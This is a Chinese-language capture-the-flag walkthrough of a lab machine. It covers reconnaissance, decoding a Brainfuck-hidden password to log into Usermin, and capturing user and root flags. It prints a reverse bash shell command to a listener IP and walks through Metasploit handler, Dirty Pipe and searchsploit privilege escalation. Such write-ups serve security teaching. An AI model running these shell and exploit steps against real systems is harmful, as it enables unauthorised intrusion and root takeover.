以下為靶機基礎資訊

![靶機資訊](assets/01-target-info.png)

資訊收集
===========================================================

![nmap 資訊](assets/02-recon-nmap-info.png)
- 利用nmap對該ip進行掃描
- 發現靶機開有許多不同的port
- 靶機開放80,139,445,10000,20000這些port，其中139,445為smb

![80 port 頁面](assets/03-recon-port-80-page.png)
- 這是80 port的頁面

![80 port 原始碼](assets/04-recon-view-source-port-80.png)
- 在80 port 的 view source 裡，在頁面的最下面發現一個加密資訊（如下）
--------------------------------------------------------------------------
don't worry no one will get here, it's safe to share with you my access. Its encrypted :) ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++. 
- ------------------------------------------------------------------------

![10000 port Webmin](assets/05-recon-port-10000-webmin.png)
- 這是10000 port的頁面，它是webmin的登入portal

![20000 port Usermin](assets/06-recon-port-20000-usermin.png)
- 這是20000 port的頁面，它是usermin的登入portal

![enum4linux 枚舉結果](assets/07-recon-enum4linux.png)
- 由於靶機有開放smb服務，因此可以利用enum4linux取得資訊
- 透過enum4linux 172.20.10.3 -a 可以取得可登入的username（如圖）

解密
===========================================================

![brainfuck 解密](assets/08-decode-brainfuck.png)
- 由於密文只有`+`、`-`、`<`、`>`、`[`、`]`、`.`、`,` 經查找他為brainfuck加密形式
- 利用brainfuck Decode取得密碼： **.2uqPEfj3D<P'a-3** 
- 可以從enum4linux上得知user裡面有個用戶叫**cyber**
- 嘗試用這組賬號密碼登入**webmin**和**usermin**

![登入 usermin](assets/09-decode-usermin-login.png)
- 這組賬密能夠成功登入**usermin**

![usermin 登入後畫面](assets/10-decode-usermin-login-2.png)

取得user flag
===========================================================

![upload and downloads 功能](assets/11-user-flag-upload-downloads.png)
- 在usermin這裡的applications 可以發現一個可以操作的地方（upload and download）

![下載 flag 檔案](assets/12-user-flag-download-flag.png)
- 在這個頁面，可以在download from server裡下載檔案
- 一般flag會放在/home/user 目錄下

![搜尋 user flag](assets/13-user-flag-search-flag.png)
- 在這個目錄下有最有可能是flag的只有user.txt
- 將該檔案下載但主機上，並在主機端使用cat指令讀取改檔案

![取得 user flag](assets/14-user-flag-captured.png)
- 取得flag ***3mp!r3{You_Manage_To_Break_To_My_Secure_Access}***

提權
===========================================================

![usermin command shell](assets/15-privesc-usermin-command-shell.png)
- 在usermin的login目錄能夠找到command shell

![測試 command shell](assets/16-privesc-command-check-version.png)
- 利用uname -a 測試command shell 是否能夠使用

![msfconsole handler](assets/17-privesc-msfconsole-handler.png)
- 利用msfconsole 的*/multi/handler* 套件來監聽靶機

![查看 handler 參數](assets/18-privesc-handler-options.png)
- 查看這個套件需要的資訊
- 並填上必要的資訊

![設定 payload 參數](assets/19-privesc-set-payload-options.png)
 - 設定套件用來監聽的payload

![執行 handler](assets/20-privesc-run-handler.png)
- 設定完成以後，執行該套件，並等待靶機段輸入反向的bash

![反向 shell 指令](assets/21-privesc-reverse-shell.png)
- 正在靶機端執行方向的bash，指令如下
- ***bash -i >& /dev/tcp/172.20.10.2/4444 0>&1***

![升級 session](assets/22-privesc-upgrade-session.png)
- 輸入background，是sessions在不斷開的情況下回到在msfconsole
- sessions -u 1，是將原本的reverse bash的sessions提升至meterpreter sessions

![local exploit suggester](assets/23-privesc-local-exploit-suggester.png)
- 在msfconsole裡面尋找可以用來exploit的script，指令如下
- ***use post/multi/recon/local_exploit_suggester***
- 並查看需要哪些必要資訊（sessions）

![選擇提權模組](assets/24-privesc-choose-exploit.png)
- msfconsole會依據sessions來尋找相對應的可用插件
- 如圖，綠色為推薦可使用插件，紅色為不推薦可使用插件

![dirty pipe 模組](assets/25-privesc-dirty-pipe-module.png)
- 使用推薦的插件，這裡使用dirtypipe
- 查看該插件的需要填的資訊

![設定 dirty pipe 參數](assets/26-privesc-set-module-options.png)
- 執行後，能夠得到一個具有Root 權限的sessions（session 3）

![建立 root session](assets/27-privesc-root-session-created.png)

![切換 root session](assets/28-privesc-select-root-session.png)
- 切換到Root的session
- ***-i***  是值 interactive

![開啟 root shell](assets/29-privesc-open-root-shell.png)
- 在這裡可以可以看到是Root的權限
- 執行***execute -f /bin/bash -i -H***
- ***-f*** 檔案 
- ***/bin/bash***  linux的terminal
- ***-H*** 隱藏

![取得 root flag](assets/30-privesc-root-flag.png)
- 理由***cat***讀取***rOOt.txt***這個flag的檔案
- 取得flag ***3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}***

提權（方法二）
===========================================================
![查詢系統版本](assets/31-privesc2-check-system-version.png)
- 利用uname -a 查詢係統版本

![searchsploit 結果](assets/32-privesc2-searchsploit.png)
- 利用searchsploit 尋找該版本對應的弱點提權腳本
- 其中50808.c就直接寫明它能夠提權

![上傳 exploit 檔案](assets/33-privesc2-upload-exploit-file.png)
- 將50808.c直接上傳到server上

![使用 reverse bash](assets/34-privesc2-reverse-bash.png)
- 利用reverse bash反向連線

![netcat 連線](assets/35-privesc2-netcat-connection.png)
- 利用nc連接到伺服器
- 將50808.c製作出執行檔，但是伺服器並沒有gcc功能

![製作執行檔](assets/36-privesc2-build-binary.png)
- 在主機端製作執行檔並將它上傳

![提升執行權限](assets/37-privesc2-chmod-binary.png)
- 到/tmp 目錄上，執行shell執行檔，但是權限不足
- 利用chmod提升執行權限

![取得 root 權限](assets/38-privesc2-gain-root.png)

- 執行後，利用***python3 -c 'import pty; pty.spawn("/bin/bash")'*** 升級至互動式的shell
- 升級後，就能得知自己是root
